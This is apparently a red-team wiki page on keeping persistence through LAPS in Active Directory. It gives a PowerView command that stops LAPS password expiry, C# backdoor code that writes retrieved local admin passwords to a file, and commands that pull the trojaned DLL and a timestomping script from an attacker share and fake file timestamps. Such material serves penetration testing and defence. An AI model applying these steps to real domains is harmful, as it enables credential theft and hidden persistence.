# LAPS

## Theory

The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.

This page is about persitence, you may have a look on [LAPS-based attacks](broken-reference) and [LAPS enumeration](../recon/objects-and-settings/laps.md).

## Practice

### Never Expire Password

LAPS may be configured to automatically update a computers password on a regular basis. If we have compromised a computer and elevated to SYSTEM we can update the value to never expire for 10 years as a means of persistence.

{% tabs %}
{% tab title="Windows" %}
With the following commands, using `Set-DomainObject` from [Powersploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), we can update the `ms-Mcs-AdmPwdExpirationTime` value to never expire for 10 years.

```powershell
# PowerView
Set-DomainObject -Identity computer01 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
Setting 'ms-Mcs-AdmPwdExpirationTime' to '136257686710000000' for object '[HostName$]'
```

{% hint style="info" %}
The password will still reset if an **admin** uses the **`Reset-AdmPwdPassword`** cmdlet; or if **Do not allow password expiration time longer than required by policy** is enabled in the LAPS GPO.
{% endhint %}
{% endtab %}
{% endtabs %}

### LAPS Backdoor

The original source code for LAPS can be found [here](https://github.com/GreyCorbel/admpwd). It's possible to put a backdoor in the code (inside the `Get-AdmPwdPassword` method in `Main/AdmPwd.PS/Main.cs` for example) that will somehow **exfiltrate new passwords or store them somewhere**.

{% tabs %}
{% tab title="Backdoor" %}
Add some evil code inside the [Get-AdmPwdPassword](https://github.com/GreyCorbel/admpwd/blob/1461172b2002ce37e31c221f6532a8ce7de1a295/Main/AdmPwd.PS/Main.cs#L140) function and Recompile [admpwd](https://github.com/GreyCorbel/admpwd):&#x20;

```csharp
//Example of backdoor in Get-AdmPwdPassword
PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
var line = $"{pi.ComputerName} : {pi.Password}";
System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
WriteObject(pi);
```

After compiling it, upload the new  `AdmPwd.PS.dll` to the machine in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (and change the modification time using [Set-MacAttribute.ps1](https://github.com/obscuresec/PowerShell/blob/master/Set-MacAttribute.ps1)).

```powershell
#Replace AdmPwd.PS.dll
cd C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS
copy \\<ATTACKING_IP\share\AdmPwd.PS.dll .

#Timestomp
Import-Module \\<ATTACKING_IP\share\Set-MacAttribute.ps1
Set-MacAttribute -FilePath C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\AdmPwd.PS.dll -OldFilePath C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\AdmPwd.PS.psd1
#Or manuall Timestomp
PowerShell.exe -com {$file=(gi C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\AdmPwd.PS.dll);$date='01/03/2006 12:12 pm';$file.LastWriteTime=$date;$file.LastAccessTime=$date;$file.CreationTime=$date}
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/laps#backdoor" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps#backdoor" %}
